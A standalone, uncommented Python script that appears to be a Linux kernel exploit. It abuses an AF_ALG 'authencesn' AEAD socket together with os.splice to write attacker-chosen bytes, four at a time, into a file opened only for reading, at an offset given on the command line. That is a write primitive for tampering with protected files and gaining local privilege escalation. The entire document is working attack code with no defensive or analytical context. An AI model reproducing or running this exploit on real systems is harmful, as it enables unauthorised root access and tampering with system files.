#!/usr/bin/env python3
import os
import socket
import sys


def write4(fd, offset, chunk):
    a = socket.socket(38, 5, 0)
    a.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
    level = 279
    a.setsockopt(level, 1, bytes.fromhex("0800010000000010" + "0" * 64))
    a.setsockopt(level, 5, None, 4)
    u, _ = a.accept()
    zero = b"\x00"
    o = offset + 4
    u.sendmsg(
        [b"A" * 4 + chunk],
        [
            (level, 3, zero * 4),
            (level, 2, b"\x10" + zero * 19),
            (level, 4, b"\x08" + zero * 3),
        ],
        32768,
    )
    r, w = os.pipe()
    os.splice(fd, w, o, offset_src=0)
    os.splice(r, u.fileno(), o)
    try:
        u.recv(8 + offset)
    except Exception:
        pass


path = sys.argv[1]
offset = int(sys.argv[2], 0)
data = bytes.fromhex(sys.argv[3][4:]) if sys.argv[3].startswith("hex:") else sys.argv[3].encode()
fd = os.open(path, os.O_RDONLY)
for i in range(0, len(data), 4):
    chunk = data[i : i + 4].ljust(4, b"\x00")
    write4(fd, offset + i, chunk)
